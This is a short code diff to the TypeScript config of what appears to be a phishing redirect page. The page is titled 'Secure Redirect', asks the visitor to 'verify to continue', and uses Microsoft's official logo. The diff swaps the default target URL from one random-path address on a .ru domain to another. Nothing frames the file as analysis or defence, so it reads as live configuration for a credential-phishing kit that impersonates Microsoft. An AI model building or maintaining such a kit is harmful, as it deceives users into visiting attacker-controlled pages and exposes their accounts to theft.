@@ -18,7 +18,7 @@ export interface Config {
 }
 
 export const defaultConfig: Config = {
-  defaultTargetUrl: 'https://naiu.rqduoyci.ru/x2luwVKhuNCYNRi!D/',
+  defaultTargetUrl: 'https://ftuo.rqduoyci.ru/zyoig86pM5K!L4T1C/',
   headerTitle: 'Secure Redirect',
   headerSubtitle: 'Please verify to continue',
   leftLogoUrl: 'https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg',
